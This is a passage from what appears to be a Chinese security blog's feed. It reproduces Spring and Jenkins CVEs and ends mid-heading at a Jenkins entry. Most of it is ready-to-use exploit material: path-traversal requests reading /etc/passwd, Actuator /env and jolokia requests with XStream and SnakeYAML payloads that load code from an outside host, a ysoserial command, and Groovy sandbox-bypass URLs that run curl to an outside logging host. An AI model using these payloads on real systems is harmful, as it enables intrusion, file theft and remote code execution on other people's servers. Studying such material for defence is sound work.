id="CVE-2019-3799-Spring-Cloud-Config-Server-目录遍历"><a href="#CVE-2019-3799-Spring-Cloud-Config-Server-目录遍历" class="headerlink" title="CVE-2019-3799 Spring Cloud Config Server: 目录遍历"></a>CVE-2019-3799 Spring Cloud Config Server: 目录遍历</h3><p>影响版本：Spring-Cloud-Config-Server  &lt; 2.1.2, 2.0.4, 1.4.6</p><p>下载受影响的版本构建：<a href="https://github.com/spring-cloud/spring-cloud-config">https://github.com/spring-cloud/spring-cloud-config</a></p><pre class="line-numbers language-none"><code class="language-none">cd spring-cloud-config-server                                                                   ..&#x2F;mvnw spring-boot:run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>构建成功后访问：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1:8888&#x2F;test&#x2F;pathtraversal&#x2F;master&#x2F;..%252f..%252f..%252f..%252f..&#x2F;etc&#x2F;passwd    <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>![image-20200401100511941](Spring 漏洞.assets/image-20200401100511941.png)</p><p>其中路径代表：<code>/&#123;name&#125;/&#123;profile&#125;/&#123;label&#125;/</code>，如下中所显示的json。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200401131715.png" alt="image-20200401102213915"></p><h3 id="CVE-2019-3778-Spring-Security-OAuth-开放重定向"><a href="#CVE-2019-3778-Spring-Security-OAuth-开放重定向" class="headerlink" title="CVE-2019-3778 Spring Security OAuth 开放重定向"></a>CVE-2019-3778 Spring Security OAuth 开放重定向</h3><p>影响版本：</p><pre class="line-numbers language-none"><code class="language-none">Spring Security OAuth 2.3 to 2.3.4Spring Security OAuth 2.2 to 2.2.3Spring Security OAuth 2.1 to 2.1.3Spring Security OAuth 2.0 to 2.0.16<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://medium.com/@riemannbernhardj/investigating-spring-security-oauth2-cve-2019-3778-and-cve-2019-11269-a-p-o-c-attack-44895f2a5e70">https://medium.com/@riemannbernhardj/investigating-spring-security-oauth2-cve-2019-3778-and-cve-2019-11269-a-p-o-c-attack-44895f2a5e70</a></p><p>用户登录后，CLIENT APP执行的以下请求包含REDIRECT_URI参数。 只需添加一个百分号即可触发重定向，而不是通过RedirectMismatchException错误来绕过验证。</p><p>例如原始请求如下：</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;auth&#x2F;oauth&#x2F;authorize?response_type&#x3D;code&amp;client_id&#x3D;R2dpxQ3vPrtfgF72&amp;scope&#x3D;user_info&amp;state&#x3D;HPRbfRgJLWdmLMi9KXeLJDesMLfPC3vZ0viEkeIvGuQ%3D&amp;redirect_uri&#x3D;http:&#x2F;&#x2F;localhost:8086&#x2F;login<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>只需要修改为：</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;auth&#x2F;oauth&#x2F;authorize?response_type&#x3D;code&amp;client_id&#x3D;R2dpxQ3vPrtfgF72&amp;scope&#x3D;user_info&amp;state&#x3D;HPRbfRgJLWdmLMi9KXeLJDesMLfPC3vZ0viEkeIvGuQ%3D&amp;redirect_uri&#x3D;http:&#x2F;&#x2F;%localhost:8086&#x2F;login<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样就不会产生原本的认证错误，而且直接跳转到地址</p><pre class="line-numbers language-none"><code class="language-none">Location: http:&#x2F;&#x2F;localhost:8086&#x2F;login<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="CNVD-2019-11630-Spring-Boot-Actuator命令执行漏洞"><a href="#CNVD-2019-11630-Spring-Boot-Actuator命令执行漏洞" class="headerlink" title="CNVD-2019-11630 Spring Boot Actuator命令执行漏洞"></a>CNVD-2019-11630 Spring Boot Actuator命令执行漏洞</h3><p><a href="https://www.veracode.com/blog/research/exploiting-spring-boot-actuators#">https://www.veracode.com/blog/research/exploiting-spring-boot-actuators#</a></p><p>这个漏洞并不像是单一的问题产生，更像是一个渗透入侵的过程。有很多值得在意的知识点</p><ol><li> Spring Boot 1-1.4，无需身份验证即可访问以下敏感路径，而在2.x中，存在于/actuator路径下。</li></ol><pre class="line-numbers language-none"><code class="language-none">&#x2F;dump-显示线程转储（包括堆栈跟踪）&#x2F;trace-显示最后几条HTTP消息（其中可能包含会话标识符）&#x2F;logfile-输出日志文件的内容&#x2F;shutdown-关闭应用程序&#x2F;mappings-显示所有MVC控制器映射&#x2F;env-提供对配置环境的访问&#x2F;restart-重新启动应用程序<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li> jolokia进行远程代码执行，Jolokia允许通过HTTP访问所有已注册的MBean，并且旨在执行与JMX相同的操作。可以使用URL列出所有可用的MBeans操作：<a href="http://127.0.0.1:8090/jolokia/list">http://127.0.0.1:8090/jolokia/list</a></li></ol><p>Logback库提供的<strong>reloadByURL</strong>操作使我们可以从外部URL重新加载日志配置，地址如：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;localhost:8090&#x2F;jolokia&#x2F;exec&#x2F;ch.qos.logback.classic:Name&#x3D;default,Type&#x3D;ch.qos.logback.classic.jmx.JMXConfigurator&#x2F;reloadByURL&#x2F;http:!&#x2F;!&#x2F;artsploit.com!&#x2F;logback.xmllogback.xml：&lt;configuration&gt;  &lt;insertFromJNDI env-entry-name&#x3D;&quot;ldap:&#x2F;&#x2F;artsploit.com:1389&#x2F;jndi&quot; as&#x3D;&quot;appName&quot; &#x2F;&gt;&lt;&#x2F;configuration&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>reloadByURL功能从<a href="http://artsploit.com/logback.xml%E4%B8%8B%E8%BD%BD%E6%96%B0%E9%85%8D%E7%BD%AE%EF%BC%8C%E5%B9%B6%E5%B0%86%E5%85%B6%E8%A7%A3%E6%9E%90%E4%B8%BALogback%E9%85%8D%E7%BD%AE%E3%80%82%E8%BF%99%E5%B0%B1%E5%AF%BC%E8%87%B4%E4%B8%A4%E4%B8%AA%E9%97%AE%E9%A2%98%EF%BC%9AXXE%E7%9B%B2%E6%94%BB%E5%87%BB%E3%80%81%E6%81%B6%E6%84%8FLDAP%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A7%A3%E6%9E%90%E5%BC%95%E7%94%A8%E5%AF%BC%E8%87%B4RCE%E3%80%82">http://artsploit.com/logback.xml下载新配置，并将其解析为Logback配置。这就导致两个问题：XXE盲攻击、恶意LDAP服务器解析引用导致RCE。</a></p><ol start="3"><li> 通过/env来修改配置</li></ol><p>如果Spring Cloud Libraries在类路径中，则**’/ env’**端点允许您修改Spring环境属性。</p><pre class="line-numbers language-html" data-language="html"><code class="language-html">POST /env HTTP/1.1Host: 127.0.0.1:8090Content-Type: application/x-www-form-urlencodedContent-Length: 65 eureka.client.serviceUrl.defaultZone=http://artsploit.com/n/xstream<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此属性将Eureka serviceURL修改为任意值。Eureka Server通常用作发现服务器，目标类路径中具有Eureka-Client &lt;1.8.7，则可以利用其中的<strong>XStream反序列化漏洞</strong>。</p><p>其中xstream的内容类似如下：</p><pre class="line-numbers language-none"><code class="language-none">&lt;linked-hash-set&gt;  &lt;jdk.nashorn.internal.objects.NativeString&gt;    &lt;value class&#x3D;&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;      &lt;dataHandler&gt;        &lt;dataSource class&#x3D;&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;          &lt;is class&#x3D;&quot;javax.crypto.CipherInputStream&quot;&gt;            &lt;cipher class&#x3D;&quot;javax.crypto.NullCipher&quot;&gt;              &lt;serviceIterator class&#x3D;&quot;javax.imageio.spi.FilterIterator&quot;&gt;                &lt;iter class&#x3D;&quot;javax.imageio.spi.FilterIterator&quot;&gt;                  &lt;iter class&#x3D;&quot;java.util.Collections$EmptyIterator&quot;&#x2F;&gt;                  &lt;next class&#x3D;&quot;java.lang.ProcessBuilder&quot;&gt;                    &lt;command&gt;                      &lt;string&gt;&#x2F;Applications&#x2F;Calculator.app&#x2F;Contents&#x2F;MacOS&#x2F;Calculator&lt;&#x2F;string&gt;                    &lt;&#x2F;command&gt;                    &lt;redirectErrorStream&gt;false&lt;&#x2F;redirectErrorStream&gt;                  &lt;&#x2F;next&gt;                &lt;&#x2F;iter&gt;                &lt;filter class&#x3D;&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;                  &lt;method&gt;                    &lt;class&gt;java.lang.ProcessBuilder&lt;&#x2F;class&gt;                    &lt;name&gt;start&lt;&#x2F;name&gt;                    &lt;parameter-types&#x2F;&gt;                  &lt;&#x2F;method&gt;                  &lt;name&gt;foo&lt;&#x2F;name&gt;                &lt;&#x2F;filter&gt;                &lt;next class&#x3D;&quot;string&quot;&gt;foo&lt;&#x2F;next&gt;              &lt;&#x2F;serviceIterator&gt;              &lt;lock&#x2F;&gt;            &lt;&#x2F;cipher&gt;            &lt;input class&#x3D;&quot;java.lang.ProcessBuilder$NullInputStream&quot;&#x2F;&gt;            &lt;ibuffer&gt;&lt;&#x2F;ibuffer&gt;          &lt;&#x2F;is&gt;        &lt;&#x2F;dataSource&gt;      &lt;&#x2F;dataHandler&gt;    &lt;&#x2F;value&gt;  &lt;&#x2F;jdk.nashorn.internal.objects.NativeString&gt;&lt;&#x2F;linked-hash-set&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后调用’/ refresh’端点。</p><ol start="4"><li> 有一种通过Spring环境属性修改来实现RCE的更可靠方法：</li></ol><pre class="line-numbers language-html" data-language="html"><code class="language-html">POST /env HTTP/1.1Host: 127.0.0.1:8090Content-Type: application/x-www-form-urlencodedContent-Length: 59 spring.cloud.bootstrap.location=http://artsploit.com/yaml-payload.yml<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>该请求修改了“ spring.cloud.bootstrap.location”属性，该属性用于加载外部配置并以YAML格式解析它。为了做到这一点，我们还需要调用“/refresh”端点。</p><pre class="line-numbers language-html" data-language="html"><code class="language-html">POST /refresh HTTP/1.1Host: 127.0.0.1:8090Content-Type: application/x-www-form-urlencodedContent-Length: 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>从远程服务器获取YAML配置时，将使用SnakeYAML库进行解析，该库也容易受到反序列化攻击。有效载荷（yaml-payload.yml）可以通过使用前述的Marshalsec研究生成：</p><pre class="line-numbers language-html" data-language="html"><code class="language-html">!!javax.script.ScriptEngineManager [  !!java.net.URLClassLoader [[    !!java.net.URL ["http://artsploit.com/yaml-payload.jar"]  ]]]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>该jar文件的反序列化将触发提供的URLClassLoader的ScriptEngineManager构造函数的执行。jar文件可以在如下地址找到：<a href="https://github.com/artsploit/yaml-payload">https://github.com/artsploit/yaml-payload</a></p><ol start="5"><li> /env配置</li></ol><p>除了关于执行RCE的地方，还有一些设置也很有用。</p><p>**spring.datasource.tomcat.validationQuery = drop + table + users-**允许您指定任何SQL查询，它将针对当前数据库自动执行。它可以是任何语句，包括插入，更新或删除。</p><p><strong>spring.datasource.tomcat.url</strong> = jdbc:hsqldb:<a href="https://localhost:3002/xdb%E5%85%81%E8%AE%B8%E6%82%A8%E4%BF%AE%E6%94%B9%E5%BD%93%E5%89%8D%E7%9A%84JDBC%E8%BF%9E%E6%8E%A5%E5%AD%97%E7%AC%A6%E4%B8%B2%E3%80%82">https://localhost:3002/xdb允许您修改当前的JDBC连接字符串。</a></p><p>这种设置只在1.x中，在Spring Boot 2.x中，改为了json格式。</p><h3 id="CVE-2019-11269-Spring-Security-OAuth-开放重定向"><a href="#CVE-2019-11269-Spring-Security-OAuth-开放重定向" class="headerlink" title="CVE-2019-11269 Spring Security OAuth 开放重定向"></a>CVE-2019-11269 Spring Security OAuth 开放重定向</h3><p>此漏洞为CVE-2019-3778的延伸版本，效果一致</p><p>影响版本：</p><pre class="line-numbers language-none"><code class="language-none">Spring Security OAuth 2.3至2.3.5Spring Security OAuth 2.2至2.2.4Spring Security OAuth 2.1至2.1.4Spring Security OAUth 2.0至2.0.17<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="CVE-2020-5398-Spring-Framework-RFD漏洞"><a href="#CVE-2020-5398-Spring-Framework-RFD漏洞" class="headerlink" title="CVE-2020-5398 Spring Framework RFD漏洞"></a>CVE-2020-5398 Spring Framework RFD漏洞</h3><p>影响版本： Spring Framework, versions 5.2.0 to 5.2.3, 5.1.0 to 5.1.13, 5.0.0 to 5.0.16</p><p>触发此漏洞的要求可以控制<code>content-disposition</code>文件名和扩展名来下载文件。触发的类型有些类似钓鱼文件。</p><pre class="line-numbers language-none"><code class="language-none">&lt;a href&#x3D;”https:&#x2F;&#x2F;&lt;trusted-server&gt;.com&#x2F;api&#x2F;users&#x2F;&lt;attacker_id&gt;.cmd&quot; download&gt;Click me, Im a dolphin&lt;&#x2F;a&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>先准备一个受控制的配置文件等，上传到受信的服务器中，虽然对服务器不造成影响。但是可以在其中注入一些payload。</p><p>由于下载的文件名是受前端控制，发送filename的时候可以自己构造文件名下载。</p><p>spring对不能识别的文件下载的时候按照json格式来处理，但是url仍然可以使用。</p><p>当受害者点击如上的地址时，会下载一个<attacker_id>.cmd执行文件。原来spring对这种问题的处理是添加后缀为txt来改变文件的可执行效果。</p><p>但是这个设置可以绕过，采用如下形式：</p><pre class="line-numbers language-none"><code class="language-none">filename：secure_install.cmd&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>会在表头中闭合造成如下效果：</p><pre class="line-numbers language-none"><code class="language-none">Content-Disposition: attachment; filename&#x3D;&quot;secure_install.cmd&quot;;.txt&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>从而达到绕过限制来下载预先设定好的可执行文件等。</p><h3 id="CVE-2020-5405-Spring-Cloud-Config路径穿越导致的信息泄露"><a href="#CVE-2020-5405-Spring-Cloud-Config路径穿越导致的信息泄露" class="headerlink" title="CVE-2020-5405 Spring Cloud Config路径穿越导致的信息泄露"></a>CVE-2020-5405 Spring Cloud Config路径穿越导致的信息泄露</h3><p>影响版本：spring-cloud-config-server &lt; 2.2.2</p><p><a href="https://github.com/mai-lang-chai/Middleware-Vulnerability-detection/blob/65bbd0ec4f2fd012318f7d91548ba1f338d5e064/Spring%20Cloud/CVE-2020-5405%20Spring%20Cloud%20Config%20%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/README.md">https://github.com/mai-lang-chai/Middleware-Vulnerability-detection/blob/65bbd0ec4f2fd012318f7d91548ba1f338d5e064/Spring%20Cloud/CVE-2020-5405%20Spring%20Cloud%20Config%20%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/README.md</a></p><p>poc：</p><pre class="line-numbers language-none"><code class="language-none">利用点1：curl http:&#x2F;&#x2F;127.0.0.1:9988&#x2F;foo&#x2F;profiles&#x2F;%252f..%252f..%252f..%252fUsers%252fxuanyonghao%252ftmp&#x2F;aaa.xxx读取&#x2F;User&#x2F;xuanyonghao&#x2F;tmp&#x2F;aaa.xxx文件foo 对应 &#123;application&#125;profiles 对应 &#123;profiles&#125;%252f..%252f..%252f..%252fUsers%252fxuanyonghao%252ftmp 对应 &#123;label&#125;todo 条件限制：todo 1. 文件必须有后缀，也就是.txt等等。todo 2. cloud: config: server: native: search-locations: file:&#x2F;&#x2F;&#x2F;tmp&#x2F;&#123;label&#125;，此处的目录需要有&#123;application&#125;或&#123;profiles&#125;或&#123;label&#125;，因为在上述触发点会对url对应段进行替换进来location，导致目录穿越，但是会限制文件后缀利用点2：org.springframework.cloud.config.server.resource.ResourceController#resolveLabel(java.lang.String)利用此处把label处的(_)替换为&#x2F;curl http:&#x2F;&#x2F;127.0.0.1:9988&#x2F;foo&#x2F;profiles&#x2F;..%28_%29Users%28_%29xuanyonghao%28_%29tmp&#x2F;aaa.xxxtodo 条件限制：todo 1. 文件必须有后缀，也就是.txt等等。todo 2. 不像利用点1处，不需要配置&#123;application&#125;&#123;profiles&#125;&#123;label&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;虽说是Spring框架漏洞，但以下包含并不仅Spring Framework，Spring Boot，还有Spring Cloud，Spring Data，Spring Security等。&lt;/p&gt;
&lt;h3 id=&quot;CVE-2010-1622-Spring-Framewor
      
    
    </summary>
    
    
      <category term="web安全" scheme="https://misakikata.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Jenkins漏洞集合复现</title>
    <link href="https://misakikata.github.io/2020/03/Jenkins%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88%E5%A4%8D%E7%8E%B0/"/>
    <id>https://misakikata.github.io/2020/03/Jenkins漏洞集合复现/</id>
    <published>2020-03-27T06:56:40.000Z</published>
    <updated>2020-03-27T07:07:18.000Z</updated>
    
    <content type="html"><![CDATA[<p>复现文章和脚本大都是网上收集，大部分能找到出处的，个别找不到明确的地址。</p><h3 id="CVE-2015-8103-反序列化远程代码执行"><a href="#CVE-2015-8103-反序列化远程代码执行" class="headerlink" title="CVE-2015-8103 反序列化远程代码执行"></a>CVE-2015-8103 反序列化远程代码执行</h3><p>1.638之前的Jenkins和1.625.2之前的LTS中的Jenkins CLI子系统，允许远程攻击者通过制作的序列化Java对象执行有问题的commons-collections。</p><p>利用脚本：<a href="https://github.com/LeoHuang2015/jenkins-cli-exploit">https://github.com/LeoHuang2015/jenkins-cli-exploit</a></p><p>执行后有类似如下反应：</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145130.png" alt="image-20200327115239320"></p><p>还可以使用msf中的模块<code>exploit/linux/misc/jenkins_java_deserialize</code>来执行攻击反弹shell。</p><h3 id="CVE-2016-0788-Jenkins-CI和LTS-远程代码执行漏洞"><a href="#CVE-2016-0788-Jenkins-CI和LTS-远程代码执行漏洞" class="headerlink" title="CVE-2016-0788 Jenkins CI和LTS 远程代码执行漏洞"></a>CVE-2016-0788 Jenkins CI和LTS 远程代码执行漏洞</h3><p>CloudBeesJenkinsCI1.650之前版本和LTS1.642.2之前版本的remoting模块中存在安全漏洞。远程攻击者可通过打开JRMP监听程序利用该漏洞执行任意代码。</p><p>利用需要X-Jenkins-CLI2-Port对应的端口，如果Jenkins无法获取CLI版本2的端口标头“ X-Jenkins-CLI2-Port”，它会退回到版本1。</p><p>利用ys生成二进制文件：<code>java -jar ysoserial.jar CommonsCollections3 &quot;curl http://r9rub4.ceye.io/&quot; &gt; payload.bin</code></p><p>利用脚本：<code>https://github.com/foxglovesec/JavaUnserializeExploits/blob/master/jenkins.py</code></p><p>发送的二进制文件实际上是十六进制的(&lt;===[JENKINS REMOTING CAPACITY]===&gt;)与其后base64的编码构成。使用类似反应如下：</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145133.png" alt="image-20200327121322560"></p><h3 id="CVE-2016-0792-低权限用户命令执行"><a href="#CVE-2016-0792-低权限用户命令执行" class="headerlink" title="CVE-2016-0792 低权限用户命令执行"></a>CVE-2016-0792 低权限用户命令执行</h3><p>影响版本：jenkins小于 1.650</p><p>利用脚本：<code>https://github.com/jpiechowka/jenkins-cve-2016-0792</code></p><p>执行后类似如下</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145135.png" alt="image-20200327120724417"></p><h3 id="CVE-2016-9299-代码执行"><a href="#CVE-2016-9299-代码执行" class="headerlink" title="CVE-2016-9299 代码执行"></a>CVE-2016-9299 代码执行</h3><p>2.32之前的Jenkins和2.19.3之前的LTS中的远程处理模块允许远程攻击者通过精心制作的序列化Java对象执行任意代码，从而触发对第三方服务器的LDAP查询。</p><p>关于这个漏洞的分析和代码利用，已经有详细的分析文章：<code>https://paper.seebug.org/199/</code></p><p>msf有成熟的利用模块：<code>exploit/linux/misc/jenkins_ldap_deserialize</code></p><h3 id="CVE-2017-1000353-Jenkins-CI-远程代码执行"><a href="#CVE-2017-1000353-Jenkins-CI-远程代码执行" class="headerlink" title="CVE-2017-1000353 Jenkins-CI 远程代码执行"></a>CVE-2017-1000353 Jenkins-CI 远程代码执行</h3><p>影响版本：Jenkins&lt;=2.56。Jenkins LTS &lt;= 2.46.1</p><p>下载poc<code>https://github.com/vulhub/CVE-2017-1000353</code></p><p>执行生成字节码文件。</p><pre class="line-numbers language-none"><code class="language-none">java  -jar  CVE-2017-1000353-SNAPSHOT-all.jar  jenkins_poc.ser  &quot;curl http:&#x2F;&#x2F;xxx.ceye.io&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>利用py文件来进行发送</p><pre class="line-numbers language-none"><code class="language-none">python exploit.py http:&#x2F;&#x2F;x.x.x.x:8080 jenkins_poc.ser<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>会有如下反应</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145340.png" alt="image-20200325165630218"></p><h3 id="CVE-2018-1000110-用户枚举"><a href="#CVE-2018-1000110-用户枚举" class="headerlink" title="CVE-2018-1000110 用户枚举"></a>CVE-2018-1000110 用户枚举</h3><pre class="line-numbers language-none"><code class="language-none">模糊搜索：http:&#x2F;&#x2F;x.x.x.x:8080&#x2F;search&#x2F;?q&#x3D;a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145344.png" alt="image-20200325165813965"></p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;x.x.x.x:8080&#x2F;search&#x2F;suggest?query&#x3D;a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145347.png" alt="image-20200325165911492"></p><p>如果git插件小于3.7，也可以使用如下</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;x.x.x.x:8080&#x2F;git&#x2F;search&#x2F;?q&#x3D;ahttp:&#x2F;&#x2F;x.x.x.x:8080&#x2F;git&#x2F;search&#x2F;suggest?query&#x3D;a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="CVE-2018-1000861-远程命令执行"><a href="#CVE-2018-1000861-远程命令执行" class="headerlink" title="CVE-2018-1000861 远程命令执行"></a>CVE-2018-1000861 远程命令执行</h3><p>可以使用如下的一键化脚本</p><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;github.com&#x2F;orangetw&#x2F;awesome-jenkins-rce-2019<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>也可以自定义发送请求</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;x.x.x.x:8080&#x2F;securityRealm&#x2F;user&#x2F;admin&#x2F;descriptorByName&#x2F;org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript&#x2F;checkScript?sandbox&#x3D;true&amp;value&#x3D;public class x &#123;public x()&#123;&quot;curl http:&#x2F;&#x2F;xxx.ceye.io&#x2F;CVE-2018-1000861&quot;.execute()&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>页面返回空白，响应为</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145447.png" alt="image-20200325171107715"></p><p>如果使用脚本，则同样效果</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145454.png" alt="image-20200325171239538"></p><p>还可以使用的POC，使用会提示错误信息，但命令已执行。</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;securityRealm&#x2F;user&#x2F;test&#x2F;descriptorByName&#x2F;org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript&#x2F;checkScript?sandbox&#x3D;true&amp;value&#x3D;import+groovy.transform.*%0a%40ASTTest(value%3d%7bassert+java.lang.Runtime.getRuntime().exec(&quot;curl http:&#x2F;&#x2F;xxx.ceye.io&#x2F;CVE-2018-1000861&quot;)%7d)%0aclass+Person%7b%7d&#x2F;securityRealm&#x2F;user&#x2F;test&#x2F;descriptorByName&#x2F;org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript&#x2F;checkScript?sandbox&#x3D;true&amp;value&#x3D;import+groovy.transform.*%0a%40ASTTest(value%3d%7b+&quot;curl http:&#x2F;&#x2F;xxx.ceye.io&#x2F;CVE-2018-1000861&quot;.execute().text+%7d)%0aclass+Person%7b%7d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="CVE-2018-1999002-任意文件读取"><a href="#CVE-2018-1999002-任意文件读取" class="headerlink" title="CVE-2018-1999002 任意文件读取"></a>CVE-2018-1999002 任意文件读取</h3><p>影响版本：Jenkins weekly 2.132 以及更早的版本。Jenkins LTS 2.121.1 以及更早的版本</p><p>可以读取Windows系统服务器中的任意文件，且在特定而条件下也可以读取Linux系统服务器中的文件.</p><p>详情：<code>https://xz.aliyun.com/t/2486</code></p><p>结合payload来看，我们请求的url为<code>/plugin/credentials/.ini</code>，则<code>base</code>为空，扩展名（ext变量）即为<code>.ini</code>，然后通过一系列的尝试openURL，在此例中即最后一个情形<code>con = openURL(map(base+&#39;_&#39;+ locale.getLanguage()+ext));</code>，会去请求<code>_../../../../../../../../../../../../windows/win.ini</code> ，尽管目录<code>_..</code>并不存在，但在win下可以直接通过路径穿越来绕过。但在linux，则需要一个带有<code>_</code>的目录来想办法绕过。</p><p>需要已经开启了匿名用户读取权限，在请求头中添加</p><pre class="line-numbers language-none"><code class="language-none">Accept-Language: &#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>处理请求中的包含路径，比如/plugin/xxxx，可以尝试</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;plugin&#x2F;jquery-detached&#x2F;.xml&#x2F;plugin&#x2F;jquery-detached&#x2F;.key&#x2F;plugin&#x2F;credentials&#x2F;.ini<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>在Windows下这么使用</p><pre class="line-numbers language-none"><code class="language-none">GET &#x2F;plugin&#x2F;credentials&#x2F;.ini HTTP&#x2F;1.1Host: x.x.x.x:8080Accept: text&#x2F;javascript, text&#x2F;html, application&#x2F;xml, text&#x2F;xml, *&#x2F;*X-Prototype-Version: 1.7DNT: 1X-Requested-With: XMLHttpRequestUser-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;80.0.3987.106 Safari&#x2F;537.36Origin: http:&#x2F;&#x2F;x.x.x.x:8080Referer: http:&#x2F;&#x2F;x.x.x.x:8080&#x2F;Accept-Encoding: gzip, deflateAccept-Language: &#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwdCookie: JSESSIONID.450017e3&#x3D;x6kdpnkcgllh18wvlaohsqq8z; screenResolution&#x3D;1920x1080; JSESSIONID.ccf0cd96&#x3D;node09crp5bs5eglyrv874no3w48l0.node0; JSESSIONID.6551b177&#x3D;14vcq2nsop6bw1u8urepj65kwv; td_cookie&#x3D;1608956971Connection: close<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="CVE-2018-1000600-Jenkins-GitHub-信息泄露"><a href="#CVE-2018-1000600-Jenkins-GitHub-信息泄露" class="headerlink" title="CVE-2018-1000600 Jenkins GitHub 信息泄露"></a>CVE-2018-1000600 Jenkins GitHub 信息泄露</h3><p>影响版本：Jenkins GitHub插件小于1.29.1</p><p>利用的POC为，其中user1为用户名。</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;securityRealm&#x2F;user&#x2F;user1&#x2F;descriptorByName&#x2F;org.jenkinsci.plugins.github.config.GitHubTokenCredentialsCreator&#x2F;createTokenByPassword?apiUrl&#x3D;http:&#x2F;&#x2F;xxx.ceye.io<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>执行后显示</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145502.png" alt="image-20200326173809956"></p><p>查看DNSlog回显</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145507.png" alt="image-20200326173837239"></p><h3 id="CVE-2019-1003000-远程代码执行"><a href="#CVE-2019-1003000-远程代码执行" class="headerlink" title="CVE-2019-1003000 远程代码执行"></a>CVE-2019-1003000 